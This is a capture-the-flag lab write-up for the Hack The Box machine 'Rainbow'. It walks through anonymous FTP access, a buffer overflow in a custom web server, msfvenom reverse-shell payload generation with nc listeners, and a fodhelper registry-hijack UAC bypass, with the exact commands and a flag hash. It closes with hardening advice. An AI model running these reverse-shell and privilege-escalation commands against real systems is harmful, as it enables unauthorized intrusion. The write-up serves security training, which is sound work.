# HTB Write-Up: Rainbow

| Field      | Details                                                            |
|------------|--------------------------------------------------------------------|
| Platform   | [Hack The Box](https://app.hackthebox.com/machines/Rainbow)        |
| Difficulty | Medium                                                             |
| OS         | Windows                                                            |
| Author     | Samurai                                                             |
| Date       | May 28, 2026                                                       |

---

## Table of Contents

1. [Reconnaissance](#1-reconnaissance)
2. [Enumeration — Anonymous FTP & File Analysis](#2-enumeration--anonymous-ftp--file-analysis)
3. [Initial Access — Buffer Overflow in rainbow.exe](#3-initial-access--buffer-overflow-in-rainbowexe)
4. [Privilege Escalation — UAC Bypass via fodhelper.exe](#4-privilege-escalation--uac-bypass-via-fodhelperexe)
5. [Summary](#5-summary)

---

## 1. Reconnaissance

Port scanning was performed with **Nmap** for service and OS fingerprinting:

```bash
nmap -sV -sC -O -T4 10.129.234.171
```

**Open Ports:**

| Port | Service      | Details                                    |
|------|--------------|--------------------------------------------|
| 21   | FTP          | Microsoft ftpd — **anonymous login allowed** |
| 80   | HTTP         | Microsoft IIS httpd 10.0                   |
| 135  | MSRPC        | Microsoft Windows RPC                      |
| 139  | NetBIOS      | Microsoft Windows netbios-ssn              |
| 445  | SMB          | microsoft-ds                               |
| 3389 | RDP          | Microsoft Terminal Services                |
| 8080 | HTTP (proxy) | Rainbow Webserver 0.1 — Dev Wiki           |

The machine name is **RAINBOW** and the domain is **rainbow**, running **Windows Server 2019 Build 17763**.

Notable findings:
- **Port 21** — Anonymous FTP login is allowed and contains interesting files
- **Port 8080** — A custom web server called *Rainbow Webserver 0.1* is running, serving a "Dev Wiki" page marked as under development
- **Port 3389** — RDP is open, useful for lateral movement if credentials are obtained

---

## 2. Enumeration — Anonymous FTP & File Analysis

### 2.1 — Anonymous FTP Login

Anonymous FTP access was confirmed and the share contents listed:

```bash
ftp 10.129.234.171
```

```
Name: anonymous
Password: <blank>
230 User logged in.

ftp> ls
01-18-22  08:22AM                  258 dev.txt
01-18-22  08:30AM                54784 rainbow.exe
01-16-22  01:34PM                  479 restart.ps1
01-16-22  12:14PM       <DIR>          wwwroot
```

All files were downloaded for analysis. The standout item is **`rainbow.exe`** — a 54 KB Windows executable likely corresponding to the Rainbow Webserver service running on port 8080.

### 2.2 — Binary Analysis & Offset Calculation

`rainbow.exe` was analyzed for buffer overflow vulnerabilities. The EIP offset was calculated by comparing two addresses recovered during crash analysis:

```python
python -c 'print(0xb3fbe4 - 0xb3f950)'
# 660
```

The offset to EIP is **660 bytes**.

### 2.3 — JMP ESP Opcode for Return Address

A `JMP` instruction targeting `-660` bytes (to jump back into the buffer) was assembled using `msf-nasm_shell`:

```bash
msf-nasm_shell
nasm > jmp -660
00000000  E967FDFFFF        jmp 0xfffffd6c
```

The return address opcode is `\xe9\x67\xfd\xff\xff`.

### 2.4 — Shellcode Generation

A reverse shell payload was generated with `msfvenom`, excluding bad characters `\x00`, `\x0a`, and `\x0d`:

```bash
msfvenom -a x86 --platform windows -p windows/shell_reverse_tcp \
  -b "\x00\x0a\x0d" LHOST=10.10.15.24 LPORT=443 -f python
```

```
x86/shikata_ga_nai chosen with final size 351
Payload size: 351 bytes

buf =  b""
buf += b"\xdb\xd2\xb8\xcc\x85\xd7\xc9\xd9\x74\x24\xf4\x5b"
buf += b"\x33\xc9\xb1\x52\x83\xeb\xfc\x31\x43\x13\x03\x8f"
...
```

---

## 3. Initial Access — Buffer Overflow in rainbow.exe

The crafted exploit (NOP sled + shellcode, padded to the 660-byte offset, followed by the JMP return address) was sent to the Rainbow service on port 8080 with a listener running on port 443:

```bash
rlwrap nc -nvlp 443
```

The overflow triggered a reverse shell as the service account:

```
connect to [10.10.15.24] from (UNKNOWN) [10.129.234.171]
Microsoft Windows [Version 10.0.17763.7434]

C:\Temp> whoami
rainbow\rainbow
```

**User flag retrieved** from `C:\Users\rainbow\Desktop\user.txt`.

---

## 4. Privilege Escalation — UAC Bypass via fodhelper.exe

### 4.1 — Identify Architecture & Privileges

```cmd
echo %PROCESSOR_ARCHITECTURE%
AMD64
```

```cmd
whoami /priv
```

The `rainbow` user account has **SeImpersonatePrivilege** enabled, and UAC is active. The `fodhelper.exe` UAC bypass was chosen as the escalation path because it requires no user interaction and works reliably on Windows Server 2019.

### 4.2 — Generate x64 Reverse Shell

A 64-bit reverse shell executable was generated to match the system architecture:

```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=1234 -f exe > samurai.exe
```

```
Payload size: 460 bytes
Final size of exe file: 7680 bytes
```

`samurai.exe` was uploaded to `C:\Temp\` on the target.

### 4.3 — UAC Bypass via fodhelper Registry Hijack

`fodhelper.exe` auto-elevates and reads from `HKCU\Software\Classes\ms-settings` before launching. By writing a payload path into that key, it executes as a high-integrity (Administrator) process without a UAC prompt.

```cmd
C:\Windows\Sysnative\cmd.exe

reg delete HKCU\Software\Classes\ms-settings /f

reg add HKCU\Software\Classes\ms-settings\Shell\Open\command ^
  /v DelegateExecute /t REG_SZ /d "" /f

reg add HKCU\Software\Classes\ms-settings\Shell\Open\command ^
  /d "C:\Temp\samurai.exe" /f

C:\Windows\System32\fodhelper.exe
```

### 4.4 — Elevated Shell Received

A listener was running on the attacker machine:

```bash
rlwrap nc -nvlp 1234
```

```
connect to [10.10.15.24] from (UNKNOWN) [10.129.234.171] 52091
Microsoft Windows [Version 10.0.17763.7434]

C:\Windows\system32> whoami
rainbow\rainbow     ← process token elevated to high integrity
```

**Root flag retrieved:**

```cmd
type C:\Users\Administrator\Desktop\root.txt
0345a3d3e72da619043fc43211d0985e
```

---

## 5. Summary

| Phase                  | Technique                                       | Result                                                   |
|------------------------|-------------------------------------------------|----------------------------------------------------------|
| Recon                  | Nmap service + OS scan                          | FTP, IIS, SMB, RDP, custom Rainbow service identified    |
| FTP Enumeration        | Anonymous FTP login                             | `rainbow.exe`, `dev.txt`, `restart.ps1` downloaded       |
| Vulnerability Research | Static analysis + crash offset calculation      | EIP offset = 660 bytes; bad chars `\x00\x0a\x0d`        |
| Shellcode              | msfvenom x86 shikata_ga_nai                     | 351-byte encoded reverse shell payload                   |
| Initial Access         | Buffer overflow exploit → port 443 reverse shell | Shell as `rainbow\rainbow`; user flag retrieved          |
| Architecture Check     | `%PROCESSOR_ARCHITECTURE%`                      | AMD64 confirmed — x64 payload required                   |
| Payload Generation     | msfvenom x64 shell_reverse_tcp                  | `samurai.exe` (7680 bytes)                               |
| Privilege Escalation   | fodhelper.exe UAC bypass (ms-settings hijack)   | Elevated shell; root flag from `\Administrator\Desktop`  |

### Key Takeaways

- **Anonymous FTP should never expose application binaries.** Providing `rainbow.exe` over FTP gave direct access to the vulnerable service binary, making static analysis and offset calculation trivial. Publicly accessible FTP shares should contain only files explicitly intended for unauthenticated access.

- **Custom web servers require the same hardening as production software.** Rainbow Webserver 0.1 lacked basic input validation, making it exploitable via a classic stack-based buffer overflow. Any networked service — however small — must validate input length and enable modern mitigations (ASLR, DEP, stack cookies).

- **fodhelper UAC bypass is trivially exploitable on misconfigured systems.** Because `fodhelper.exe` is auto-elevated and reads from a user-writable registry hive (`HKCU`), any user with access to `cmd.exe` can silently bypass UAC. UAC should be set to *Always Notify*, and sensitive auto-elevating binaries should be monitored for unexpected registry reads under `HKCU`.

- **SeImpersonatePrivilege on a non-service account expands the attack surface.** Auditing token privileges across all accounts and revoking unnecessary rights is an essential step in hardening Windows environments against privilege escalation.
